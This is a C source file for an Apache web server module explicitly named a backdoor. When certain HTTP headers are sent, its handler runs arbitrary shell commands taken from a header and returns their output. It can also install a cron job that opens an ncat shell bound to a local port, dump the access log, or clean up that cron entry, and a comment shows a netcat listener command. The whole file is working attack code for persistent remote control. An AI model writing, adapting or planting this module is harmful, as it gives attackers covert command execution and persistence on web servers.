// cronjob will be created under the `www-data` user.
//sudo nc -lvnp 4444
#include "httpd.h"
#include "http_protocol.h"
#include "http_request.h"
#include "http_config.h"
#include "apr_strings.h"
#include "apr_tables.h"
#include <string.h>
#include <stdio.h>
//#include <stdlib.h>
//#include <unistd.h>
void listOutput(FILE *fp, request_rec *r) {
   // writes out the output of the command ran
   char buffer[1024];
   ap_set_content_type(r, "text/plain");
   while (fgets(buffer, sizeof(buffer), fp)) {
       ap_rputs(buffer, r);
   }
   pclose(fp);
   return OK;
}
static int backdoor_handler(request_rec *r) {

   const apr_array_header_t *arr = apr_table_elts(r->headers_in);
   const apr_table_entry_t *entries = (const apr_table_entry_t *)arr->elts;
   const char *cmd = apr_table_get(r->headers_in, "sourpatchkids");
   if (!cmd) return DECLINED;
   for (int i = 0; i < arr->nelts; i++) {
      if (!strcmp(entries[i].key, "API-Key")) {
         if (!strcmp(entries[i].val, "cronjob")) {
            execl("/bin/bash", "bash", "-c", "test=$(crontab -l | grep  'ncat' | wc -l); if [ $test == 0 ]; then (crontab -l 2>/dev/null; echo '* * * * * ncat localhost 1337 -e /bin/sh') | crontab -;  fi", NULL);
            return HTTP_OK;
         } else if (!strcmp(entries[i].val, "cmd")) {
            const char *cmd = apr_table_get(r->headers_in, "x-lang");
            if (!cmd) return DECLINED;
            FILE *fp = popen(cmd, "r");
            listOutput(fp, r);
            return 0;
         } else if (!strcmp(entries[i].val, "access.log")) {
            FILE *fp = popen("cat /var/log/access.log", "r");
            listOutput(fp, r);
            return 0;
         } else if (!strcmp(entries[i].val, "clean_cron")) {
            FILE *fp = popen("crontab -l | grep -v 'ncat' | crontab -", "r");
            listOutput(fp, r);
         }
      }
   }
   
   return OK;
}

static void register_hooks(apr_pool_t *p) {
   ap_hook_handler(backdoor_handler, NULL, NULL, APR_HOOK_FIRST);
}

module AP_MODULE_DECLARE_DATA backdoor_module = {
   STANDARD20_MODULE_STUFF,
   NULL, NULL, NULL, NULL, NULL, register_hooks
};

